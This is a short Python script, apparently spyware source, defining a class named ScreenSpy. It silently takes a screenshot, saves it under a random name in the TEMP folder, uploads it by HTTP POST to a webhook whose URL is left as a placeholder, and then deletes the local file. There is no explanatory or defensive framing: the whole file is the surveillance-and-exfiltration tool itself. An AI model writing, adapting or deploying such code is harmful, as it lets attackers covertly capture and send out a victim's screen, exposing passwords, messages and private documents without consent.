import requests
import os
import random
import string
import pyautogui

class ScreenSpy:

    def __init__(self):
        self.file_path = self.capture_screenshot()
        self.send_to_webhook(self.file_path)
        os.remove(self.file_path)

    def capture_screenshot(self):
        screenshot = pyautogui.screenshot()

        file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5)) + ".png"
        file_path = os.path.join(os.getenv('TEMP'), file_name)
        screenshot.save(file_path)

        return file_path

    def send_to_webhook(self, file_path):
        webhook_url = " Your webhook "
        with open(file_path, "rb") as file:
            files = {"image": file}
            response = requests.post(webhook_url, files=files)


if __name__ == "__main__":
    ScreenSpy()
